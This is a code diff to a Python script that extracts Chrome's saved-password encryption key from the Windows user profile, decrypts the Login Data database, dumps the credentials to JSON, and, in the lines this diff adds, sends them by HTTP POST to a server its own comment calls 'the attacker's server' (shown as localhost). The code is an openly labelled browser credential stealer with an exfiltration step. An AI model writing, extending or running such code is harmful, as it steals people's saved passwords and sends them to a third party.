@@ -5,10 +5,12 @@ import win32crypt
 from Crypto.Cipher import AES
 import os
 import json
+import requests
 
 encKeyPath = r"%s\AppData\Local\Google\Chrome\User Data\Local State"
 loginDataPath = r"%s\AppData\Local\Google\Chrome\User Data\Default\Login Data"
 
+# method that gets the encryption key from windows
 def getEncryptionKey(endKeyPath):
     f = open(os.path.normpath(encKeyPath%(os.environ['USERPROFILE'])))
     opened = f.read()
@@ -26,6 +28,7 @@ def getEncryptionKey(endKeyPath):
     
     return enc_key
 
+# method that gets the encrypted login data and decrypts it
 def getAndDecryptLoginData(loginDataPath):
     #Chrome username & password file path
     path_login_db = os.path.normpath(loginDataPath%(os.environ['USERPROFILE']))
@@ -40,6 +43,7 @@ def getAndDecryptLoginData(loginDataPath):
 
     return data, cursor, conn
 
+# method used to build the json file with the stolen data
 def buildJson():
     enc_key = getEncryptionKey(encKeyPath)
     data, cursor, conn = getAndDecryptLoginData(loginDataPath)
@@ -66,4 +70,13 @@ def buildJson():
         # Write the JSON data to the file
         json.dump(data, f)
 
-buildJson()
+    return data
+
+# get the json file
+dataFile = buildJson()
+
+# send the data to the attacker's server
+url = 'http://localhost:5000/send/json'
+headers = {'Content-Type': 'application/json'}  # Set the Content-Type header
+response = requests.post(url, json=dataFile, headers=headers)
+print(response.text)
